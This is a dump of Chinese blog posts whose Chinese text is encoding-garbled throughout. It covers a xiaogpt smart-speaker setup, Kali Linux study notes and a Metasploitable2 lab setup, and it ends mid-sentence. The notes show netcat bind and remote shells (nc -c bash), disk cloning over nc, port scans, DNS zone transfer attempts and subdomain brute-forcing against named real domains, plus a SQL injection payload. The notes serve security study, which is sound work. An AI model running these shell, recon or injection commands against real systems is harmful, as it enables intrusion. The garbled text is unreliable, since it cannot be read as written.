https://pypi.doubanio.com/simple/ export MI_USER=181******** export MI_PASS=************ micli list è®°å½•did ç›®å½•ç»“æ„ config.jsonï¼š è®¾ç½®å…³é”®è¯â€œè¯·â€ï¼Œè·Ÿå°çˆ±åŒå­¦å¯¹è¯æ—¶è¯´â€œä»‹ç»ä¸€ä¸‹ä½ è‡ªå·±â€å°çˆ±å›ç­”ï¼Œè¯´â€œè¯·ä»‹ç»ä¸€ä¸‹ä½ è‡ªå·±â€å°çˆ±åŒå­¦ä¼šè°ƒç”¨chatgptå›ç­”ï¼ˆå…³é”®è¯è§¦å‘ï¼Œå°†å¯¹è¯å†…å®¹å‘ç»™gptï¼Œä¼ å›å°çˆ±åŒå­¦ç”¨TTSæœ—è¯»ï¼‰ hardwareï¼šè®¾å¤‡å‹å·ï¼Œåœ¨å°çˆ±éŸ³ç®±èƒŒé¢æˆ–è€…åº•éƒ¨ï¼Œå¦‚æœæ²¡æœ‰åˆ™ä½¿ç”¨micli minaæŸ¥çœ‹ { &quot;openai_key&quot;:&quot;&quot;, &quot;api_base&quot;:&quot;&quot;, &quot;openai_api_model&quot;:&quot;&quot;, &quot;hardware&quot;:&quot;L07A&quot;, &quot;mute_xiaoai&quot;: true, &quot;account&quot;: &quot;&quot;, &quot;password&quot;:&quot;&quot;, &quot;mi_did&quot;:&quot;&quot;, &quot;bot&quot;: &quot;chatgptapi&quot;, &quot;tts&quot;: &quot;mi&quot;, &quot;prompt&quot;: &quot;ä½ çš„åå­—å«å°çˆ±GPTï¼Œæ˜¯ä¸€ä¸ªäººå·¥æ™ºèƒ½åŠ©æ‰‹ï¼Œä½ çš„å›ç­”å°½é‡ç®€æ˜æ‰¼è¦ï¼Œå›ç­”æ€»æ•°ä¸èƒ½è¶…è¿‡150å­—ã€‚&quot;, &quot;keyword&quot;: [ &quot;è¯·&quot; ], &quot;stream&quot;: true docker-compose.yaml version: '3.8' services: xiaogpt: image: yihong0618/xiaogpt volumes: - ./config:/config ports: - &quot;9527:9527&quot; restart: always command: --config=/config/config.json ","link":"https://hellogu.github.io/post/xiao-ai-yin-xiang-jie-ru-chatgpt/"},{"title":"è‹‘æˆ¿å®Kaliç¬”è®°","content":" è™½ç„¶ä¹‹å‰åšè¿‡ä¸€äº›webå®‰å…¨æµ‹è¯•ç›¸å…³çš„å·¥ä½œï¼Œä½†å¤§éƒ½æ˜¯åƒNessusä¹‹ç±»çš„å®‰å…¨æ‰«æå·¥å…·çš„ä½¿ç”¨ï¼Œåœ¨æ‰‹å·¥å‘æ˜æ¼æ´è¿™å—èƒ½åŠ›æ¯”è¾ƒæ¬ ç¼ºï¼Œå¦å¤–åƒwiresharkã€burpsuiteç­‰å·¥å…·ä»…ä»…å­¦ä¹ äº†æœ€åŸºç¡€çš„æŠ“åŒ…å’Œä»£ç†çš„ç”¨æ³•ï¼Œå¯¹äºburpsuiteçš„ä¸€äº›ç¬¬ä¸‰æ–¹æ’ä»¶ä¹Ÿæ¥è§¦æ¯”è¾ƒå°‘ï¼Œäºæ˜¯æƒ³è¦ç³»ç»Ÿçš„å­¦ä¹ ä¸€ä¸‹ç½‘ç»œå®‰å…¨æµ‹è¯•è¿™å—ï¼Œåœ¨52pjä¸Šæ‰¾åˆ°äº†è‹‘æˆ¿å®çš„ã€ŠKali Linuxå®‰å…¨æµ‹è¯•ã€‹177è®²ï¼Œä¸è¿‡æ•™ç¨‹æ˜¯2015å¹´çš„äº†ï¼Œè¯¾ç¨‹ä¸­è®²åˆ°çš„ä¸€äº›å·¥å…·æœ‰çš„å·²ç»åœæ­¢ç»´æŠ¤ï¼Œæœ‰çš„ç‰ˆæœ¬æ›´æ–°ä¹‹åä½¿ç”¨å‘½ä»¤å‘ç”Ÿäº†æ”¹å˜ï¼Œæ‰€ä»¥åœ¨è¿™ç¯‡ç¬”è®°ä¸­è®°å½•ä¸€ä¸‹ï¼Œæ–¹ä¾¿è‡ªå·±åç»­çš„ä½¿ç”¨ã€‚ kaliåŸºç¡€é…ç½® å¼€å¯SSHç™»å½• ç¼–è¾‘sshæ–‡ä»¶ï¼Œå–æ¶ˆPermitRootLoginå’ŒPasswordAuthenticationçš„æ³¨é‡Šï¼Œå¹¶æ”¹ä¸ºyesï¼› é‡å¯SSHæœåŠ¡ï¼Œ/etc/init.d/ssh restart æˆ–è€…service ssh restarté‡å¯ï¼Œ/etc/init.d/ssh statusæˆ–è€…service ssh statusæŸ¥çœ‹çŠ¶æ€æ˜¯å¦æ­£å¸¸è¿è¡Œ å¼€å¯sshæœåŠ¡å¼€æœºè‡ªå¯åŠ¨ï¼ŒæŸ¥çœ‹å¼€å¯çŠ¶æ€ï¼Œupdate-rc.d ssh enableæˆ–è€…systemctl enable sshå¼€æœºè‡ªå¯åŠ¨vi /etc/ssh/sshd_config #viæ¨¡å¼ä¸‹è¾“å…¥'/å…³é”®è¯'å›è½¦è¿›è¡Œæœç´¢ï¼ŒæŒ‰næŸ¥æ‰¾ä¸‹ä¸€ä¸ª service ssh restart update-rc.d ssh enable kaliå·¥å…· nc&amp;ncat ä¼ è¾“æ–‡æœ¬ä¿¡æ¯ ä¸»æœºAï¼šnc -l -p 4444 å¼€å¯ä¸€ä¸ªç›‘å¬æœåŠ¡ï¼Œç«¯å£4444 ä¸»æœºBï¼šnc â€“nv 1.1.1.1 4444 è¿æ¥ä¸»æœºAçš„4444ç«¯å£ ä¼ è¾“â½‚ä»¶ Aï¼šnc -lp 333 &gt; 1.mp4 Bï¼šnc -nv 1.1.1.1 333 &lt; 1.mp4 â€“q 1 -qï¼šä¼ è¾“å®Œæˆ1såæ–­å¼€è¿æ¥ æˆ–è€… Aï¼šnc -q 1 -lp 333 &lt; a.mp4 Bï¼š nc -nv 1.1.1.1 333 &gt; 2.mp4 ncå·¥å…·æœ¬èº«ä¸æ”¯æŒåŠ å¯†è¿æ¥ï¼Œå¦‚æœéœ€è¦åŠ å¯†ä¼ è¾“ï¼Œå¯ä»¥å…ˆæŠŠè¦ä¼ è¾“çš„å†…å®¹é€šè¿‡mcryptåŠ å¯†å†æ˜æ–‡ä¼ è¾“ Aï¼šnc -lp 333 | mcrypt --flush -Fbqd -a rijndael-256 -m ecb &gt; 1.mp4 Bï¼š mcrypt --flush -Fbq -a rijndael-256 -m ecb &lt; a.mp4 | nc -nv 1.1.1.1 333 -q 1 mcrypt: è°ƒç”¨mcryptåŠ å¯†å·¥å…· flush: æ¸…é™¤åŠ å¯†å·¥å…·çš„å†…éƒ¨çŠ¶æ€ Fbqd: è®¾ç½®ç‰¹å®šçš„é€‰é¡¹ï¼ŒåŒ…æ‹¬ä½¿ç”¨æ–‡ä»¶è¾“å…¥å’Œè¾“å‡ºã€å¯ç”¨è°ƒè¯•æ¨¡å¼ä»¥åŠå¯ç”¨è¯¦ç»†è¾“å‡º a rijndael-256: ä½¿ç”¨Rijndael-256ç®—æ³•è¿›è¡ŒåŠ å¯† m ecb: ä½¿ç”¨ECBæ¨¡å¼è¿›è¡ŒåŠ å¯†ï¼ŒECBæ˜¯ä¸€ç§åŸºæœ¬çš„åŠ å¯†æ¨¡å¼ï¼Œä¸é€‚åˆå¤„ç†å¤§é‡æ•°æ® æµåª’ä½“æœåŠ¡ Aï¼š cat 1.mp4 | nc -lp 333 å°†mp4æ–‡ä»¶catå‡ºæ¥é€šè¿‡ç®¡é“ä¼ å…¥nc Bï¼š 1.1.1.1 333 | mplayer -vo x11 -cache 3000 -ä¸»æœºBéœ€è¦ä½¿ç”¨æ”¯æŒå‘½ä»¤æ¨¡å¼çš„æ’­æ”¾å™¨æ¯”å¦‚mplayer mplayer: è°ƒç”¨MPlayeråª’ä½“æ’­æ”¾å™¨ vo x11: æŒ‡å®šè§†é¢‘è¾“å‡ºè®¾å¤‡ä¸ºX11ï¼ˆX Window Systemï¼‰ï¼Œå³åœ¨Xçª—å£ç³»ç»Ÿä¸­æ’­æ”¾è§†é¢‘ cache 3000: è®¾ç½®ç¼“å­˜å¤§å°ä¸º3000 KBï¼Œè¿™å¯ä»¥å¸®åŠ©å‡å°‘è§†é¢‘æ’­æ”¾æ—¶çš„å¡é¡¿å’Œå»¶è¿Ÿ -: è¡¨ç¤ºè¦æ’­æ”¾çš„è§†é¢‘æ–‡ä»¶æ˜¯é€šè¿‡æ ‡å‡†è¾“å…¥ä¼ è¾“çš„ï¼Œè€Œä¸æ˜¯é€šè¿‡æ–‡ä»¶åæŒ‡å®šçš„ ç«¯å£æ‰«æ nc -nvz 1.1.1.1 1-65535 -nvz: è®¾ç½®netcatä¸ºé™é»˜æ¨¡å¼ï¼ˆä¸æ˜¾ç¤ºä»»ä½•è¾“å‡ºï¼‰ã€å¯ç”¨æ•°å­—æ ¼å¼ï¼ˆæ˜¾ç¤ºIPåœ°å€å’Œç«¯å£å·ï¼‰ã€ä»¥åŠä½¿ç”¨zero I/Oæ¨¡å¼ï¼ˆä»…æ‰«æç«¯å£ï¼Œä¸å‘é€ä»»ä½•æ•°æ®ï¼‰ nc â€“vnzu 1.1.1.1 1-1024 -u: ä½¿ç”¨UDPåè®® è¿œç¨‹å…‹éš†ç¡¬ç›˜ Aï¼š nc -lp 333 | dd of=/dev/sda Bï¼š dd if=/dev/sda | nc -nv 1.1.1.1 333 â€“q 1 dd: æ˜¯ä¸€ä¸ªç”¨äºæ•°æ®è½¬æ¢å’Œå¤åˆ¶çš„å‘½ä»¤è¡Œå·¥å…· if=/dev/sda: æŒ‡å®šè¾“å…¥æ–‡ä»¶ï¼ˆinput fileï¼‰ä¸º/dev/sdaï¼Œå³æºç£ç›˜/dev/sda of=/dev/sdb: æŒ‡å®šè¾“å‡ºæ–‡ä»¶ï¼ˆoutput fileï¼‰ä¸º/dev/sdbï¼Œå³ç›®æ ‡ç£ç›˜/dev/sdb å°†Bä¸»æœºçš„/dev/sdaå…‹éš†å‡ºæ¥é€šè¿‡ncä¼ åˆ°Aä¸»æœºçš„/dev/sda è¿œç¨‹æ§åˆ¶ Aï¼šnc -lp 333 -c bash -c bash: æŒ‡å®šncæ¥å—è¿æ¥åè¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œè¿™é‡Œæ˜¯æ‰§è¡Œbashå‘½ä»¤ï¼ˆå³å¯åŠ¨ä¸€ä¸ªbash shellï¼‰ Bï¼šnc 1.1.1.1 333 æˆ–è€… Aï¼šnc -lp 333 Bï¼šnc 1.1.1.1 333 -c bash æŒ‡å®šè¿æ¥åè¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œå³bash shell ncat Aï¼šncat -c bash --allow 192.168.123.100 -vnl 333 --ssl -c bash: åœ¨è¿æ¥å»ºç«‹åï¼Œæ‰§è¡Œ bash å‘½ä»¤ï¼ˆå³å¯åŠ¨ä¸€ä¸ªäº¤äº’å¼çš„ Bash Shellï¼‰ã€‚ --allow 192.168.123.100: é™åˆ¶è¿æ¥çš„æ¥æº IP åœ°å€ä¸º 192.168.123.100ã€‚åªæœ‰æ¥è‡ªè¯¥ IP åœ°å€çš„è¿æ¥æ‰ä¼šè¢«æ¥å—ã€‚ -vnl 333: ç›‘å¬æœ¬åœ°ç«¯å£ 333ï¼Œç­‰å¾…è¿æ¥ã€‚ --ssl: ä½¿ç”¨ SSL/TLS åŠ å¯†æ¥ä¿æŠ¤è¿æ¥ã€‚ Bï¼šncat -nv 192.168.123.157 333 --ssl -nv: ä½¿ç”¨è¯¦ç»†è¾“å‡ºæ¨¡å¼ï¼Œæ˜¾ç¤ºæ›´å¤šè¿æ¥ä¿¡æ¯ã€‚ 192.168.123.157: è¦è¿æ¥çš„ç›®æ ‡ IP åœ°å€ã€‚ 333: ç›®æ ‡ä¸»æœºä¸Šè¦è¿æ¥çš„ç«¯å£ã€‚ --ssl: ä½¿ç”¨ SSL/TLS åŠ å¯†æ¥ä¿æŠ¤è¿æ¥ã€‚ wireshark&amp;tcpdump wiresharkçš„ç¤ºä¾‹capåŒ… ä¸‰æ¬¡æ¡æ‰‹ï¼š å®¢æˆ·ç«¯å‘é€ä¸€ä¸ªSYNæ•°æ®åŒ…ç»™æœåŠ¡å™¨ï¼Œè¡¨ç¤ºè¯·æ±‚å»ºç«‹è¿æ¥ã€‚ æœåŠ¡å™¨æ”¶åˆ°SYNæ•°æ®åŒ…åï¼Œå›å¤ä¸€ä¸ªSYN+ACKæ•°æ®åŒ…ç»™å®¢æˆ·ç«¯ï¼Œè¡¨ç¤ºåŒæ„å»ºç«‹è¿æ¥ã€‚ å®¢æˆ·ç«¯å†å‘é€ä¸€ä¸ªACKæ•°æ®åŒ…ç»™æœåŠ¡å™¨ï¼Œè¡¨ç¤ºè¿æ¥å»ºç«‹æˆåŠŸã€‚ è¿™æ ·å°±å®Œæˆäº†TCPçš„ä¸‰æ¬¡æ¡æ‰‹è¿‡ç¨‹ï¼Œè¿æ¥å»ºç«‹æˆåŠŸã€‚ å››æ¬¡æŒ¥æ‰‹ï¼Œç”¨äºç»ˆæ­¢è¿æ¥ã€‚ å®¢æˆ·ç«¯å‘é€ä¸€ä¸ªFINæ•°æ®åŒ…ç»™æœåŠ¡å™¨ï¼Œè¡¨ç¤ºè¦å…³é—­è¿æ¥ã€‚ æœåŠ¡å™¨æ”¶åˆ°FINæ•°æ®åŒ…åï¼Œå›å¤ä¸€ä¸ªACKæ•°æ®åŒ…ç»™å®¢æˆ·ç«¯ï¼Œè¡¨ç¤ºæ”¶åˆ°å…³é—­è¯·æ±‚ã€‚ æœåŠ¡å™¨å†å‘é€ä¸€ä¸ªFINæ•°æ®åŒ…ç»™å®¢æˆ·ç«¯ï¼Œè¡¨ç¤ºè‡ªå·±ä¹Ÿè¦å…³é—­è¿æ¥ã€‚ å®¢æˆ·ç«¯æ”¶åˆ°FINæ•°æ®åŒ…åï¼Œå›å¤ä¸€ä¸ªACKæ•°æ®åŒ…ç»™æœåŠ¡å™¨ï¼Œè¡¨ç¤ºåŒæ„å…³é—­è¿æ¥ã€‚ tcpdump -A -n 'tcp[13] = 24' -r http.cap ä½¿ç”¨tcpdumpè¯»å–æ•°æ®åŒ… -A: è¿™ä¸ªé€‰é¡¹å‘Šè¯‰tcpdumpä»¥ASCIIæ ¼å¼æ˜¾ç¤ºæ•°æ®åŒ…çš„å†…å®¹ï¼Œè€Œä¸æ˜¯ä»¥åå…­è¿›åˆ¶æ ¼å¼æ˜¾ç¤ºã€‚ -n: è¿™ä¸ªé€‰é¡¹å‘Šè¯‰tcpdumpä¸è¦å°†ç½‘ç»œåœ°å€å’Œç«¯å£è½¬æ¢ä¸ºä¸»æœºåå’ŒæœåŠ¡åï¼Œè€Œæ˜¯ä»¥æ•°å­—å½¢å¼æ˜¾ç¤ºã€‚ 'tcp[13] = 24': è¿™éƒ¨åˆ†æ˜¯è¿‡æ»¤å™¨ï¼Œç”¨äºæŒ‡å®šè¦æ•è·çš„æ•°æ®åŒ…çš„æ¡ä»¶ã€‚åœ¨è¿™é‡Œï¼Œtcp[13] = 24è¡¨ç¤ºè¿‡æ»¤å‡ºTCPæ ‡å¿—å­—æ®µçš„ç¬¬13ä¸ªå­—èŠ‚ï¼ˆå³ç¬¬ä¸€ä¸ªå­—èŠ‚ä¸º0ï¼‰çš„å€¼ä¸º24çš„æ•°æ®åŒ…ã€‚åœ¨TCPæ ‡å¿—å­—æ®µä¸­ï¼Œ24è¡¨ç¤ºSYNå’ŒACKæ ‡å¿—åŒæ—¶è¢«è®¾ç½®ï¼Œè¿™é€šå¸¸ä»£è¡¨ä¸€ä¸ªTCPè¿æ¥çš„å»ºç«‹é˜¶æ®µã€‚ åœ¨TCPæ ‡å¿—å­—æ®µä¸­ï¼Œç¬¬13ä¸ªå­—èŠ‚ï¼ˆä»0å¼€å§‹è®¡æ•°ï¼‰é€šå¸¸ç”¨æ¥è¡¨ç¤ºTCPå¤´éƒ¨ä¸­çš„æ ‡å¿—ä½ã€‚TCPå¤´éƒ¨çš„æ ‡å¿—ä½å…±æœ‰6ä¸ªï¼Œå®ƒä»¬åˆ†åˆ«æ˜¯ï¼š URGï¼ˆç´§æ€¥æŒ‡é’ˆï¼‰ï¼šç”¨æ¥æŒ‡ç¤ºç´§æ€¥æ•°æ®ã€‚ ACKï¼ˆç¡®è®¤ï¼‰ï¼šç”¨æ¥ç¡®è®¤æ”¶åˆ°çš„æ•°æ®ã€‚ PSHï¼ˆæ¨é€ï¼‰ï¼šç”¨æ¥æŒ‡ç¤ºæ¥æ”¶æ–¹å°½å¿«å°†æ•°æ®äº¤ç»™åº”ç”¨å±‚ã€‚ RSTï¼ˆå¤ä½ï¼‰ï¼šç”¨æ¥å¼ºåˆ¶å…³é—­è¿æ¥ã€‚ SYNï¼ˆåŒæ­¥ï¼‰ï¼šç”¨æ¥å»ºç«‹è¿æ¥ã€‚ FINï¼ˆç»“æŸï¼‰ï¼šç”¨æ¥é‡Šæ”¾è¿æ¥ã€‚ è¿™äº›æ ‡å¿—ä½è¢«å­˜å‚¨åœ¨TCPå¤´éƒ¨çš„ç¬¬13ä¸ªå­—èŠ‚ä¸­ï¼Œæ¯ä¸ªæ ‡å¿—ä½å 1ä¸ªæ¯”ç‰¹ä½ã€‚é€šè¿‡è®¾ç½®æˆ–æ¸…é™¤è¿™äº›æ ‡å¿—ä½ï¼ŒTCPæ§åˆ¶è¿æ¥çš„å»ºç«‹ã€ç»ˆæ­¢å’Œæ•°æ®ä¼ è¾“è¿‡ç¨‹ã€‚ CWRï¼ˆCongestion Window Reducedï¼‰å’ŒECEï¼ˆExplicit Congestion Notification Echoï¼‰æ˜¯TCPå¤´éƒ¨ä¸­çš„ä¸¤ä¸ªé¢å¤–çš„æ ‡å¿—ä½ï¼Œç”¨äºä¼ è¾“æ§åˆ¶å’Œæ‹¥å¡æ§åˆ¶ã€‚ CWRï¼ˆCongestion Window Reducedï¼‰ï¼šCWRæ ‡å¿—ä½ç”¨äºæŒ‡ç¤ºå‘é€æ–¹å·²ç»æ”¶åˆ°äº†ä¸€ä¸ªå¸¦æœ‰æ‹¥å¡é€šçŸ¥ï¼ˆCongestion Notificationï¼‰çš„æ•°æ®åŒ…ï¼Œå¹¶å·²ç»å‡å°äº†å‘é€çª—å£ï¼ˆCongestion Windowï¼‰ã€‚è¿™ä¸ªæ ‡å¿—ä½é€šå¸¸åœ¨TCPè¿æ¥ä¸­ç”¨äºæ‹¥å¡æ§åˆ¶ã€‚ ECEï¼ˆExplicit Congestion Notification Echoï¼‰ï¼šECEæ ‡å¿—ä½ç”¨äºæŒ‡ç¤ºæ¥æ”¶æ–¹æ”¶åˆ°äº†æ¥è‡ªç½‘ç»œçš„æ‹¥å¡é€šçŸ¥ã€‚å½“è·¯ç”±å™¨æˆ–ç½‘ç»œè®¾å¤‡æ£€æµ‹åˆ°ç½‘ç»œæ‹¥å¡æ—¶ï¼Œä¼šå‘æ•°æ®åŒ…ä¸­æ·»åŠ æ‹¥å¡é€šçŸ¥ï¼Œæ¥æ”¶æ–¹æ”¶åˆ°å¸¦æœ‰ECEæ ‡å¿—ä½çš„æ•°æ®åŒ…åï¼Œä¼šé€šçŸ¥å‘é€æ–¹ç½‘ç»œå‡ºç°äº†æ‹¥å¡ã€‚è¿™æœ‰åŠ©äºå‘é€æ–¹è°ƒæ•´å‘é€é€Ÿç‡ä»¥å‡è½»ç½‘ç»œæ‹¥å¡ã€‚ è¿™ä¸¤ä¸ªæ ‡å¿—ä½é€šå¸¸åœ¨TCPè¿æ¥ä¸­ç”¨äºæ‹¥å¡æ§åˆ¶å’Œç½‘ç»œæ‹¥å¡çš„å¤„ç†ï¼Œå¸®åŠ©TCPåè®®æ›´æœ‰æ•ˆåœ°é€‚åº”ç½‘ç»œçŠ¶å†µå¹¶æé«˜ç½‘ç»œæ€§èƒ½ã€‚ DNSä¿¡æ¯æ”¶é›† nslookupï¼Œdigå’Œhostéƒ½æ˜¯ç”¨äºè¿›è¡ŒDNSæŸ¥è¯¢çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œç”¨äºæŸ¥æ‰¾åŸŸåå¯¹åº”çš„IPåœ°å€æˆ–åå‘æŸ¥æ‰¾IPåœ°å€å¯¹åº”çš„åŸŸå nslookup www.sina.com æŸ¥è¯¢åŸŸåwww.sina.comå¯¹åº”çš„IPåœ°å€å’Œå…¶ä»–ç›¸å…³ä¿¡æ¯ã€‚ nslookup -type=ns example.com 156.154.70.22 æŒ‡å®šçš„åŸŸåæœåŠ¡å™¨ï¼ˆ156.154.70.22ï¼‰æŸ¥è¯¢åŸŸåexample.comçš„NSè®°å½•ï¼ˆName Serverè®°å½•ï¼‰ã€‚ dig @8.8.8.8 www.sina.com mx æŒ‡å®šè¦æŸ¥è¯¢çš„DNSæœåŠ¡å™¨ï¼ˆ8.8.8.8ï¼‰ï¼ŒæŸ¥è¯¢åŸŸåwww.sina.comçš„MXè®°å½•ï¼ˆMail Exchangeè®°å½•ï¼‰ã€‚ dig www.sina.com any æŸ¥è¯¢åŸŸåwww.sina.comçš„æ‰€æœ‰è®°å½•ç±»å‹ï¼ˆåŒ…æ‹¬Aã€MXã€NSç­‰ï¼‰ã€‚ dig +noall +answer -x 8.8.8.8 è¿›è¡Œåå‘æŸ¥è¯¢ï¼Œé€šè¿‡IPåœ°å€ï¼ˆ8.8.8.8ï¼‰æŸ¥æ‰¾å¯¹åº”çš„åŸŸåã€‚ dig +noall +answer txt chaos VERSION.BIND @ns3.dnsv4.com æŸ¥è¯¢æŒ‡å®šDNSæœåŠ¡å™¨ï¼ˆns3.dnsv4.comï¼‰çš„BINDç‰ˆæœ¬ä¿¡æ¯ã€‚ï¼ˆé€šå¸¸ä¼šè¢«æ‹’ç»ï¼‰ dig +trace example.com æ‰§è¡ŒDNSè¿½è¸ªï¼Œæ˜¾ç¤ºä»æ ¹åŸŸåæœåŠ¡å™¨åˆ°æœ€ç»ˆç›®æ ‡åŸŸåçš„DNSæŸ¥è¯¢è·¯å¾„ã€‚ dig @ns1.example.com example.com axfr åœ¨æŒ‡å®šçš„åŸŸåæœåŠ¡å™¨ï¼ˆns1.example.comï¼‰ä¸Šæ‰§è¡ŒåŒºåŸŸä¼ é€ï¼ˆAXFRï¼‰ï¼Œè·å–åŸŸåexample.comçš„å®Œæ•´DNSè®°å½•ã€‚ï¼ˆé€šå¸¸ä¼šè¢«æ‹’ç»ï¼‰ host -T -l sina.com 8.8.8.8 åœ¨æŒ‡å®šçš„DNSæœåŠ¡å™¨ï¼ˆ8.8.8.8ï¼‰ä¸Šæ‰§è¡Œæšä¸¾ï¼ˆæšä¸¾æ‰€æœ‰è®°å½•ï¼‰æŸ¥è¯¢ï¼Œåˆ—å‡ºsina.comåŸŸåçš„æ‰€æœ‰è®°å½•ã€‚ DNSå­—å…¸çˆ†ç ´ ç”±äºé€šè¿‡åŒºåŸŸä¼ é€ï¼ˆAXFRï¼‰è·å–åŸŸåä¸‹çš„å®Œæ•´DNSè®°å½•é€šå¸¸ä¼šè¢«æ‹’ç»ï¼Œæ”»å‡»è€…ä¼šä½¿ç”¨DNSå­—å…¸çˆ†ç ´æ¥æ¢æµ‹ç›®æ ‡åŸŸåä¸‹çš„å­åŸŸåã€‚é€šè¿‡ä½¿ç”¨ä¸€ä¸ªåŒ…å«å¤§é‡å¯èƒ½çš„å­åŸŸååˆ—è¡¨çš„å­—å…¸æ–‡ä»¶ï¼Œå°è¯•æšä¸¾ç›®æ ‡åŸŸåçš„æ‰€æœ‰å¯èƒ½å­åŸŸåï¼Œä»¥ä¾¿å‘ç°éšè—åœ¨å…¶åçš„èµ„æºæˆ–æœåŠ¡ã€‚å¸¸ç”¨å·¥å…·ï¼Œå¦‚&quot;fierce&quot;ã€&quot;sublist3r&quot;ç­‰ï¼ŒæŒ‡å®šä¸€ä¸ªå­—å…¸æ–‡ä»¶ï¼ˆåŒ…å«å¯èƒ½çš„å­åŸŸååˆ—è¡¨ï¼‰å¹¶æŒ‡å®šç›®æ ‡åŸŸåï¼Œç„¶åå·¥å…·å°†è‡ªåŠ¨å°è¯•æŸ¥è¯¢æ¯ä¸ªå­åŸŸåçš„DNSè®°å½•ï¼Œä»¥ç¡®å®šå“ªäº›å­åŸŸåæ˜¯æœ‰æ•ˆçš„ã€‚ fierceç­‰å·¥å…·å®‰è£…åéƒ½ä¼šè‡ªå¸¦ä¸€äº›å­—å…¸æ–‡ä»¶ï¼Œä½¿ç”¨dpkg -L fierce æ¥åˆ—å‡ºç›¸å…³æ–‡ä»¶æŸ¥æ‰¾å­—å…¸æ–‡ä»¶çš„è·¯å¾„ fierce --dns-servers 223.5.5.5 --domain sina.com.cn --subdomain-file /usr/lib/python3/dist-packages/fierce/lists/5000.txt --dns-servers 223.5.5.5: è¿™ä¸ªå‚æ•°æŒ‡å®šäº†è¦ä½¿ç”¨çš„DNSæœåŠ¡å™¨çš„IPåœ°å€ï¼Œè¿™é‡Œæ˜¯223.5.5.5ã€‚ --domain sina.com.cn: è¿™ä¸ªå‚æ•°æŒ‡å®šäº†ç›®æ ‡åŸŸåï¼Œå³è¦è¿›è¡Œå­—å…¸çˆ†ç ´çš„åŸŸåæ˜¯sina.com.cnã€‚ --subdomain-file /usr/lib/python3/dist-packages/fierce/lists/5000.txt: è¿™ä¸ªå‚æ•°æŒ‡å®šäº†åŒ…å«è¦ç”¨äºå­—å…¸çˆ†ç ´çš„å­åŸŸååˆ—è¡¨çš„æ–‡ä»¶è·¯å¾„ï¼Œè¿™é‡Œæ˜¯/usr/lib/python3/dist-packages/fierce/lists/5000.txtã€‚ atk6-dnsdict6 -d4 -t 16 -x sina.com atk6-dnsdict6é€Ÿåº¦æ›´å¿« -d4 è¡¨ç¤ºä½¿ç”¨ IPv4 è¿›è¡ŒæŸ¥è¯¢ -t 16 è¡¨ç¤ºè®¾ç½® DNS æŸ¥è¯¢çš„è¶…æ—¶æ—¶é—´ä¸º 16 æ¯«ç§’ -x åˆ™è¡¨ç¤ºä½¿ç”¨é€’å½’æŸ¥è¯¢ã€‚ å…¶ä»–ç±»ä¼¼å·¥å…· dnsenum dnsmap dnsrecon ","link":"https://hellogu.github.io/post/yuan-fang-hong-kali-bi-ji/"},{"title":"Metasploitable2é¶åœºéƒ¨ç½²","content":"Metasploitable2æ˜¯ä¸€ä¸ªä¸“é—¨è®¾è®¡ç”¨äºå®‰å…¨æµ‹è¯•å’Œæ¼æ´åˆ©ç”¨çš„è™šæ‹Ÿæœºé•œåƒã€‚å®ƒç”±Rapid7å…¬å¸å¼€å‘ï¼Œæ—¨åœ¨æä¾›ä¸€ä¸ªç”¨äºç»ƒä¹ æ¸—é€æµ‹è¯•å’Œæ¼æ´åˆ©ç”¨çš„ç¯å¢ƒï¼Œå¸®åŠ©å®‰å…¨ä¸“ä¸šäººå‘˜å’Œç ”ç©¶äººå‘˜å­¦ä¹ å’Œå®è·µæ”»å‡»æŠ€æœ¯ã€‚Metasploitable2åŸºäºUbuntu Linuxæ“ä½œç³»ç»Ÿï¼Œå¹¶é¢„è£…äº†å¤§é‡æ˜“å—æ”»å‡»çš„æ¼æ´å’Œå¼±ç‚¹ï¼ŒåŒ…æ‹¬å¸¸è§çš„æœåŠ¡å¦‚FTPã€SSHã€Telnetã€WebæœåŠ¡å™¨ã€æ•°æ®åº“ç­‰ã€‚é€šè¿‡ä½¿ç”¨Metasploitable2ï¼Œå®‰å…¨ä¸“ä¸šäººå‘˜å¯ä»¥æ¨¡æ‹ŸçœŸå®ä¸–ç•Œä¸­çš„æ”»å‡»åœºæ™¯ï¼Œç»ƒä¹ æ¸—é€æµ‹è¯•å’Œæ¼æ´åˆ©ç”¨æŠ€æœ¯ï¼Œäº†è§£æ”»å‡»è€…å¯èƒ½åˆ©ç”¨çš„æ¼æ´å’Œå¼±ç‚¹ï¼Œæé«˜å®‰å…¨é˜²æŠ¤æ„è¯†å¹¶åŠ å¼ºç½‘ç»œå®‰å…¨é˜²å¾¡èƒ½åŠ›ã€‚ 1.ä¸‹è½½å®‰è£… Step.1 ç‚¹å‡»ä¸‹è½½ Step.2.è§£å‹åå¯¼å…¥VMware è§£å‹åæ˜¯VMwareæ ¼å¼çš„è™šæ‹Ÿæœºæ–‡ä»¶ï¼Œæ²¡æœ‰æ‰¾åˆ°Hyper-Vçš„ç‰ˆæœ¬ Step.3.ä¿®æ”¹é…ç½®æ–‡ä»¶ å¯¼å…¥VMwareåå¯åŠ¨è™šæ‹Ÿæœºï¼Œç”¨æˆ·åå’Œå¯†ç éƒ½æ˜¯msfadmin ä½¿ç”¨ip aå‘½ä»¤æŸ¥çœ‹ipåœ°å€ï¼Œæµè§ˆå™¨æ‰“å¼€http://ip/mutillidae/ æ­¤æ—¶è¿›å…¥OWASP TOP 10 è¿›è¡Œç»ƒä¹ ä¼šæŠ¥é”™ï¼ŒåŸå› æ˜¯/var/www/mutillidae/config.incé…ç½®æ–‡ä»¶ä¸­çš„dbnameä¸æ­£ç¡® æ‰§è¡Œå‘½ä»¤sudo vi /var/www/mutillidae/config.incå°†dbnameä¿®æ”¹ä¸ºowasp10 ä¿®æ”¹åwq!ä¿å­˜å¹¶é€€å‡ºï¼Œå†è¿›å…¥OWASP TOP 10 -&gt; A1 Injection -&gt; SQLi-Extract Data -&gt; User Infoè¿›è¡Œç¬¬ä¸€æ¡SQLæ³¨å…¥ç»ƒä¹  ' or '1' # ç¬¬ä¸€ä¸ªå•å¼•å·å°†sqlè¯­å¥å‰é¢æˆªæ–­ï¼Œ#å·å°†sqlè¯­å¥åé¢æ³¨é‡Šï¼Œä¸­é—´ or '1' æ’æˆç«‹ï¼Œå®ç°æŸ¥è¯¢å‡ºæ‰€æœ‰ç”¨æˆ·ä¿¡æ¯ï¼Œå®Œæ•´çš„sqlè¯­å¥ä¸ºSELECT * FROM accounts WHERE username='' or '1' #' AND 